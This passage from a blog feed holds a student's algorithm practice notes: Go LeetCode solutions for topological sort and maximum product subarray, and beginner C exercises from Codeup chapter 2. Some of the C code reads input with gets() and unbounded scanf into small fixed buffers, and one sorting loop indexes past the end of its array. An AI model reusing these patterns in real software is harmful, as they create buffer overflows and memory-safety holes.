class="comment">// 入度</span></span><br><span class="line">	<span class="keyword">for</span> _, value := <span class="keyword">range</span> prerequisites &#123;</span><br><span class="line">		edges[value[<span class="number">1</span>]] = <span class="built_in">append</span>(edges[value[<span class="number">1</span>]], value[<span class="number">0</span>])</span><br><span class="line">		degree[value[<span class="number">0</span>]]++</span><br><span class="line">	&#125;</span><br><span class="line">	queue := []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; numCourses; i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> degree[i] == <span class="number">0</span> &#123;</span><br><span class="line">			queue = <span class="built_in">append</span>(queue, i)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// bfs</span></span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">len</span>(queue) &gt; <span class="number">0</span> &#123;</span><br><span class="line">		top := queue[<span class="number">0</span>]</span><br><span class="line">		queue = queue[<span class="number">1</span>:]</span><br><span class="line">		ans = <span class="built_in">append</span>(ans, top)</span><br><span class="line">		<span class="keyword">for</span> _, v := <span class="keyword">range</span> edges[top] &#123;</span><br><span class="line">			degree[v]--</span><br><span class="line">			<span class="keyword">if</span> degree[v] == <span class="number">0</span> &#123;</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, v)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(ans) != numCourses &#123;</span><br><span class="line">		<span class="keyword">return</span> []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	pre := [][]<span class="keyword">int</span>&#123;&#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">2</span>, <span class="number">0</span>&#125;, &#123;<span class="number">3</span>, <span class="number">1</span>&#125;, &#123;<span class="number">3</span>, <span class="number">2</span>&#125;&#125;</span><br><span class="line">	ans := findOrder(<span class="number">4</span>, pre)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-5-18"><a href="#2020-5-18" class="headerlink" title="2020/5/18"></a>2020/5/18</h3><h4 id="leetcode-152-乘积最大子数组-Go"><a href="#leetcode-152-乘积最大子数组-Go" class="headerlink" title="leetcode 152. 乘积最大子数组_Go"></a>leetcode 152. 乘积最大子数组_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dp</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">maxProduct</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	n := <span class="built_in">len</span>(nums)</span><br><span class="line">	<span class="keyword">if</span> n == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	maxF, minF, ans := nums[<span class="number">0</span>], nums[<span class="number">0</span>], nums[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt; n; i++ &#123;</span><br><span class="line">		mx, mn := maxF, minF</span><br><span class="line">		maxF = max(mx*nums[i], max(nums[i], mn*nums[i]))</span><br><span class="line">		minF = min(mn*nums[i], min(nums[i], mx*nums[i]))</span><br><span class="line">		ans = max(maxF, ans)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &gt; b &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">min</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &gt; b &#123;</span><br><span class="line">		<span class="keyword">return</span> b</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">-4</span>, <span class="number">-3</span>, <span class="number">2</span>&#125;</span><br><span class="line">	ans := maxProduct(nums)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法笔记_第二章</title>
    <url>/2019/12/30/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0(%E7%AC%AC%E4%BA%8C%E7%AB%A0)/</url>
    <content><![CDATA[<p>学点算法，准备PAT，如果可能的话准备复试</p>
<span id="more"></span>

<p>环境因为考试需要，我安装了CodeBlocks16.01</p>
<h2 id="2-Codeup"><a href="#2-Codeup" class="headerlink" title="2(Codeup)"></a>2(Codeup)</h2><h3 id="2-2"><a href="#2-2" class="headerlink" title="2.2"></a>2.2</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//F</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">E</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    double a,b,c;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%lf%lf%lf&quot;,&amp;a,&amp;b,&amp;c);</span></span><br><span class="line"><span class="comment">    double r1,r2;</span></span><br><span class="line"><span class="comment">    double temp;</span></span><br><span class="line"><span class="comment">    temp=sqrt(b*b-4*a*c);</span></span><br><span class="line"><span class="comment">    r1=(-b+temp)/(2*a);</span></span><br><span class="line"><span class="comment">    r2=(-b-temp)/(2*a);</span></span><br><span class="line"><span class="comment">    printf(&quot;r1=%7.2f\nr2=%7.2f&quot;,r1,r2);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">D</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int a=0,b=0;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);</span></span><br><span class="line"><span class="comment">    printf(&quot;%d&quot;,a+b);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    printf(&quot;This is my first c program!&quot;);</span></span><br><span class="line"><span class="comment">    system(&quot;pause&quot;);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">B</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    printf(&quot;********************\nVery Good!\n********************&quot;);</span></span><br><span class="line"><span class="comment">    system(&quot;pause&quot;);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">C</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int a=123,b=456;</span></span><br><span class="line"><span class="comment">    printf(&quot;sum=%d&quot;,a+b);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-3"><a href="#2-3" class="headerlink" title="2.3"></a>2.3</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//E</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> profit;</span><br><span class="line">    <span class="keyword">double</span> bonus;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>,&amp;profit);</span><br><span class="line">    <span class="keyword">if</span>(profit&lt;=<span class="number">100000</span>)</span><br><span class="line">        bonus=profit*<span class="number">0.1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="number">100000</span>&lt;profit&amp;&amp;profit&lt;=<span class="number">200000</span>)</span><br><span class="line">        bonus=(profit<span class="number">-100000</span>)*<span class="number">0.075</span>+<span class="number">100000</span>*<span class="number">0.1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="number">200000</span>&lt;profit&amp;&amp;profit&lt;=<span class="number">400000</span>)</span><br><span class="line">        bonus=(profit<span class="number">-200000</span>)*<span class="number">0.05</span>+<span class="number">100000</span>*<span class="number">0.1</span>+<span class="number">100000</span>*<span class="number">0.075</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="number">400000</span>&lt;profit&amp;&amp;profit&lt;=<span class="number">600000</span>)</span><br><span class="line">        bonus=(profit<span class="number">-400000</span>)*<span class="number">0.03</span>+<span class="number">100000</span>*<span class="number">0.1</span>+<span class="number">100000</span>*<span class="number">0.075</span>+<span class="number">200000</span>*<span class="number">0.05</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="number">600000</span>&lt;profit&amp;&amp;profit&lt;=<span class="number">1000000</span>)</span><br><span class="line">        bonus=(profit<span class="number">-600000</span>)*<span class="number">0.015</span>+<span class="number">100000</span>*<span class="number">0.1</span>+<span class="number">100000</span>*<span class="number">0.075</span>+<span class="number">200000</span>*<span class="number">0.05</span>+<span class="number">200000</span>*<span class="number">0.03</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        bonus=(profit<span class="number">-1000000</span>)*<span class="number">0.01</span>+<span class="number">100000</span>*<span class="number">0.1</span>+<span class="number">100000</span>*<span class="number">0.075</span>+<span class="number">200000</span>*<span class="number">0.05</span>+<span class="number">200000</span>*<span class="number">0.03</span>+<span class="number">400000</span>*<span class="number">0.015</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f&quot;</span>,bonus);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">D</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int a,b,c;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%d%d&quot;,&amp;a,&amp;b,&amp;c);</span></span><br><span class="line"><span class="comment">    a=max(a,b);</span></span><br><span class="line"><span class="comment">    a=max(a,c);</span></span><br><span class="line"><span class="comment">    printf(&quot;%d\n&quot;,a);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">C</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    double a,b,c;</span></span><br><span class="line"><span class="comment">    double x,y,z;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%lf%lf%lf&quot;,&amp;x,&amp;y,&amp;z);</span></span><br><span class="line"><span class="comment">    a=min(x,y);</span></span><br><span class="line"><span class="comment">    a=min(a,z);</span></span><br><span class="line"><span class="comment">    c=max(x,y);</span></span><br><span class="line"><span class="comment">    c=max(c,z);</span></span><br><span class="line"><span class="comment">    if((x!=a)&amp;&amp;(x!=c))</span></span><br><span class="line"><span class="comment">        b=x;</span></span><br><span class="line"><span class="comment">    else if((y!=a)&amp;&amp;(y!=c))</span></span><br><span class="line"><span class="comment">        b=y;</span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        b=z;</span></span><br><span class="line"><span class="comment">    printf(&quot;%.2f %.2f %.2f&quot;,a,b,c);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">B</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    double a,b;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%lf%lf&quot;,&amp;a,&amp;b);</span></span><br><span class="line"><span class="comment">    if(a&gt;b)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%.2f %.2f\n&quot;,b,a);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%.2f %.2f\n&quot;,a,b);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    double a,b,c;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%lf%lf%lf&quot;,&amp;a,&amp;b,&amp;c);</span></span><br><span class="line"><span class="comment">    double r1,r2;</span></span><br><span class="line"><span class="comment">    double temp;</span></span><br><span class="line"><span class="comment">    temp=sqrt(b*b-4*a*c);</span></span><br><span class="line"><span class="comment">    if(temp&gt;0)&#123;</span></span><br><span class="line"><span class="comment">        r1=(-b+temp)/(2*a);</span></span><br><span class="line"><span class="comment">        r2=(-b-temp)/(2*a);</span></span><br><span class="line"><span class="comment">        printf(&quot;r1=%7.2f\nr2=%7.2f&quot;,r1,r2);</span></span><br><span class="line"><span class="comment">        return 0;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    else&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;No real roots!&quot;);</span></span><br><span class="line"><span class="comment">        return 0;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-4"><a href="#2-4" class="headerlink" title="2.4"></a>2.4</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//I</span></span><br><span class="line"><span class="comment">//2/1,3/2,5/3,8/5,13/8,21/13…   分母，分子插值为斐波那契数列；分母本身也为斐波那契数列</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//m/n</span></span><br><span class="line">    <span class="keyword">double</span> n=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">double</span> m=<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">double</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">double</span> b=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">double</span> step; <span class="comment">//分母的变化</span></span><br><span class="line">    <span class="keyword">double</span> temp;</span><br><span class="line">    <span class="keyword">double</span> sum=<span class="number">2</span>/<span class="number">1.0</span>+<span class="number">3</span>/<span class="number">2.0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=<span class="number">20</span>;i++)&#123;</span><br><span class="line">        temp=a;</span><br><span class="line">        a=a+b;</span><br><span class="line">        b=temp;</span><br><span class="line">        step=a;</span><br><span class="line">        m+=step;</span><br><span class="line">        n=m-a;</span><br><span class="line">        sum+=m/n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.6f\n&quot;</span>,sum);</span><br><span class="line">    <span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">H</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n=0;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;n); //n&lt;=50</span></span><br><span class="line"><span class="comment">    int a=1,b=1;</span></span><br><span class="line"><span class="comment">    if(n&lt;=2)</span></span><br><span class="line"><span class="comment">        printf(&quot;1&quot;);</span></span><br><span class="line"><span class="comment">    else&#123;</span></span><br><span class="line"><span class="comment">        int temp=0;</span></span><br><span class="line"><span class="comment">        for(int i=3;i&lt;=n;i++)&#123;</span></span><br><span class="line"><span class="comment">            temp=a;</span></span><br><span class="line"><span class="comment">            a=a+b;</span></span><br><span class="line"><span class="comment">            b=temp;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        printf(&quot;%d&quot;,a);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">G</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    //Π/4=1-1/3+1/5-1/7+......+1/(2*n-3)-1/(2*n-1)</span></span><br><span class="line"><span class="comment">    double pi=0.0;</span></span><br><span class="line"><span class="comment">    double i=1.0;</span></span><br><span class="line"><span class="comment">    double n=1.0;</span></span><br><span class="line"><span class="comment">    double s=1.0;</span></span><br><span class="line"><span class="comment">    while(fabs(i)&gt;=1e-6)&#123;</span></span><br><span class="line"><span class="comment">        pi+=i;</span></span><br><span class="line"><span class="comment">        n+=2;</span></span><br><span class="line"><span class="comment">        s=-s;</span></span><br><span class="line"><span class="comment">        i=s/n;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    pi*=4;</span></span><br><span class="line"><span class="comment">    printf(&quot;PI=%10.8f\n&quot;,pi);</span></span><br><span class="line"><span class="comment">    //system(&quot;pause&quot;);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">F</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n=1;</span></span><br><span class="line"><span class="comment">    int i=1;</span></span><br><span class="line"><span class="comment">    int count=0;</span></span><br><span class="line"><span class="comment">    for(;i&lt;=20&amp;&amp;count&lt;20;i+=n,count++)&#123;</span></span><br><span class="line"><span class="comment">        if((i-n)/n==4)&#123;</span></span><br><span class="line"><span class="comment">            printf(&quot;%3d\n&quot;,i);</span></span><br><span class="line"><span class="comment">            ++n;</span></span><br><span class="line"><span class="comment">            i=0;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else&#123;</span></span><br><span class="line"><span class="comment">            printf(&quot;%3d&quot;,i);</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    //system(&quot;pause&quot;);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">E</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int sum=0;</span></span><br><span class="line"><span class="comment">    int i=1;</span></span><br><span class="line"><span class="comment">    while(true)&#123;</span></span><br><span class="line"><span class="comment">        sum+=i;</span></span><br><span class="line"><span class="comment">        if(sum&gt;1000)</span></span><br><span class="line"><span class="comment">            break;</span></span><br><span class="line"><span class="comment">        i++;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d\n&quot;,i);</span></span><br><span class="line"><span class="comment">    //system(&quot;pause&quot;);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">D</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int n=0,sum=0;</span></span><br><span class="line"><span class="comment">    int i=1;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d&quot;,&amp;n);</span></span><br><span class="line"><span class="comment">    while(true)&#123;</span></span><br><span class="line"><span class="comment">        if(i&gt;n)</span></span><br><span class="line"><span class="comment">            break;</span></span><br><span class="line"><span class="comment">        sum+=i;</span></span><br><span class="line"><span class="comment">        i++;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;%d&quot;,sum);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-5"><a href="#2-5" class="headerlink" title="2.5"></a>2.5</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//J</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str1[<span class="number">100</span>],str2[<span class="number">100</span>],str3[<span class="number">100</span>],max[<span class="number">100</span>];</span><br><span class="line">    gets(str1);</span><br><span class="line">    gets(str2);</span><br><span class="line">    gets(str3);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(str1,str2)&gt;<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(max,str1);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">strcpy</span>(max,str2);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(max,str3)&lt;<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">strcpy</span>(max,str3);</span><br><span class="line">    <span class="built_in">puts</span>(max);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">I</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int a[2][3];</span></span><br><span class="line"><span class="comment">    int b[3][2];</span></span><br><span class="line"><span class="comment">    memset(a,0,sizeof(a));</span></span><br><span class="line"><span class="comment">    memset(b,0,sizeof(b));</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;2;i++)</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;3;j++)</span></span><br><span class="line"><span class="comment">            scanf(&quot;%d&quot;,&amp;a[i][j]);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;3;i++)</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;2;j++)</span></span><br><span class="line"><span class="comment">            b[i][j]=a[j][i];</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;3;i++)&#123;</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;2;j++)</span></span><br><span class="line"><span class="comment">            printf(&quot;%d &quot;,b[i][j]);</span></span><br><span class="line"><span class="comment">        printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">H</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int a[10];</span></span><br><span class="line"><span class="comment">    int temp=0;</span></span><br><span class="line"><span class="comment">    memset(a,0,sizeof(a));</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;10;i++)</span></span><br><span class="line"><span class="comment">        scanf(&quot;%d&quot;,&amp;a[i]);</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;9;i++)&#123;</span></span><br><span class="line"><span class="comment">        for(int j=0;j&lt;10;j++)&#123;</span></span><br><span class="line"><span class="comment">            if(a[j+1]&lt;a[j])&#123;</span></span><br><span class="line"><span class="comment">                temp=a[j+1];</span></span><br><span class="line"><span class="comment">                a[j+1]=a[j];</span></span><br><span class="line"><span class="comment">                a[j]=temp;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;10;i++)</span></span><br><span class="line"><span class="comment">        printf(&quot;%d\n&quot;,a[i]);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">G</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int fibo[20];</span></span><br><span 